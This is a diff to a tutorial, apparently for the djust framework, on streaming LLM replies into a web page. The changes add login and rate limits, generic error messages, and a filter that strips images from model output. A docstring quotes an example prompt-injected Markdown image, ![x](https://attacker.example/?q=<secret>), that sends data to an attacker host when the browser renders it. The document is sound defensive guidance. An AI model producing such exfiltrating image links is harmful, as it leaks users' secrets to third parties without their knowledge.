@@ -2,7 +2,7 @@
 title: "Tutorial: Stream an AI response token-by-token"
 slug: tutorial-streaming-ai
 section: guides
-order: 65
+order: 50
 level: intermediate
 description: "Build a chat-style AI page that streams an LLM response into the DOM as the model generates it — using start_async to run the network call in the background, stream_to to push each chunk, and render_markdown to render in-flight markdown safely. Plus a Stop button that actually cancels the upstream request."
 ---
@@ -77,19 +77,23 @@ tokens you'll never display).
 
 ```python
 # myapp/views.py
-from djust import LiveView, action, state
+from djust import LiveView, action, rate_limit, state
 
 _STREAM = "reply"  # matches dj-stream="reply" in the template
 
 
 class ChatView(LiveView):
     template_name = "chat.html"
+    # Every prompt spends your API budget: only signed-in users may chat.
+    login_required = True
 
     prompt = state("")
     response = state("")
     streaming = state(False)
     error = state("")
 
+    # At most one prompt every 10 s on average, with a burst of 3.
+    @rate_limit(rate=0.1, burst=3)
     @action
     def submit(self, prompt: str = "", **kwargs):
         prompt = prompt.strip()
@@ -106,49 +110,77 @@ class ChatView(LiveView):
         self.cancel_async(_STREAM)  # name must match start_async(name=...)
         self.streaming = False      # the stream loop sees this and stops
 
+    # Retry calls submit() directly, which bypasses submit's rate limit,
+    # so it carries the same limit itself.
+    @rate_limit(rate=0.1, burst=3)
     @action
     def retry(self, **kwargs):
         # Re-fire submit with the prompt that's already in state.
         self.submit(prompt=self.prompt)
 ```
 
-Three things to call out:
+Four things to call out:
 
-1. **`start_async()` / `cancel_async()`** come with every `LiveView`
+1. **`login_required` and `@rate_limit`** guard your API bill. Without
+   them any visitor can spend your tokens. `@rate_limit` is a per-caller
+   token bucket enforced on the server: an event over the limit is
+   dropped, and repeated abuse closes the WebSocket. Pair it with a
+   per-user quota (see "Where to go next") for real cost control.
+2. **`start_async()` / `cancel_async()`** come with every `LiveView`
    (the base class includes `AsyncWorkMixin`, so don't list it again:
    `class ChatView(AsyncWorkMixin, LiveView)` fails with an MRO
    error). Pass the same `name` to both; `cancel_async` with a name
    that matches no task is a silent no-op.
-2. **`self.streaming`** doubles as the stop flag. Because the
+3. **`self.streaming`** doubles as the stop flag. Because the
    callback in Step 2 is `async def`, it yields to the event loop
    between chunks, so a Stop click is dispatched mid-stream and the
    loop sees `streaming` flip to `False`. A synchronous callback
    would hold a worker thread and the Stop event would queue behind
    it.
-3. **`@action`** wraps `submit` so the template can read
+4. **`@action`** wraps `submit` so the template can read
    `submit.error` (e.g. for the empty-prompt case) without
    per-handler error wiring.
 
 ---
 
-## Step 2 — The streaming callback (background thread)
+## Step 2 — The streaming callback (an async task)
 
 <!-- The openai package is a third-party dependency the doc checker
      does not install. -->
 <!-- doc-snippet-check: skip -->
 ```python
+import asyncio
+import logging
+import re
+
 from openai import AsyncOpenAI
 
 from djust import render_markdown
+from djust.streaming import MIN_STREAM_INTERVAL_S
 
+logger = logging.getLogger(__name__)
 client = AsyncOpenAI()  # picks up OPENAI_API_KEY
+
+# render_markdown's output contains <img> tags only for Markdown image
+# syntax (raw HTML in the model's text is escaped).
+_IMG_TAG = re.compile(r"<img\b[^>]*>")
+
+
+def _render_reply(text: str, *, provisional: bool) -> str:
+    """Render model output, dropping images.
+
+    The browser fetches an image as soon as it renders, so a prompt-injected
+    reply such as ![x](https://attacker.example/?q=<secret>) would send data
+    to a third party without a click. Links stay: following one needs a click.
+    """
+    return _IMG_TAG.sub("", render_markdown(text, provisional=provisional))
 
 
 class ChatView(LiveView):
     # ... as above ...
 
     async def _stream(self, prompt: str):
-        """Runs on the event loop. start_async awaits a coroutine function."""
+        """Runs on the event loop: start_async awaits a coroutine function."""
         await self.stream_start(_STREAM)
         stream = None
         try:
@@ -165,10 +197,13 @@ class ChatView(LiveView):
                     self.response += delta
                     await self.stream_to(
                         _STREAM,
-                        html=render_markdown(self.response, provisional=True),
+                        html=_render_reply(self.response, provisional=True),
                     )
-        except Exception as exc:
-            self.error = str(exc)
+        except Exception:
+            # Keep provider errors (which can include request details) in
+            # your logs; show the user a generic message.
+            logger.exception("Chat completion failed")
+            self.error = "The model request failed. Please try again."
         finally:
             if stream is not None:
                 await stream.close()  # closes the upstream HTTP connection
@@ -176,8 +211,13 @@ class ChatView(LiveView):
             # Settle the target once, without the provisional split.
             await self.stream_to(
                 _STREAM,
-                html=render_markdown(self.response, provisional=False),
+                html=_render_reply(self.response, provisional=False),
             )
+            # stream_to batches to about 60 updates a second, so the settle
+            # above may still be queued, and stream_done does not flush that
+            # queue. A queued update goes out at most one batch window after
+            # it was queued; wait two so it reaches the browser before "done".
+            await asyncio.sleep(2 * MIN_STREAM_INTERVAL_S)
             await self.stream_done(_STREAM)
 ```
 
@@ -195,10 +235,15 @@ What happens at runtime:
   `{% djust_markdown %}` uses. It keeps the unfinished trailing line
   escaped, so a half-typed code fence or `<script>` never renders as
   markup.
+- `_render_reply` removes images. `render_markdown` escapes raw HTML and
+  neutralises `javascript:` URLs, but it renders Markdown images with
+  their external URL, and the browser loads those with no click. Model
+  output can be steered by prompt injection, so treat it as untrusted.
 - If `streaming` is set to `False` (from the user clicking Stop), the
   loop breaks and `stream.close()` aborts the upstream HTTPS
   connection cleanly — no more billable tokens are generated.
-- On any exception, `self.error` is set and the cursor clears.
+- On any exception, the details go to your log, `self.error` gets a
+  generic message and the cursor clears.
 
 ---
 
@@ -278,7 +323,7 @@ slow pulse. Cosmetic — drop it if you find it distracting.
 ## What just happened, end to end
 
 ```
-   Browser                Server (WebSocket thread)        Background thread        OpenAI
+   Browser                Server (WS event handler)        Async task (event loop)  OpenAI
       │                          │                                 │                  │
       │ submit("Explain LV…")   │                                 │                  │
       │ ───────────────────────► │                                 │                  │
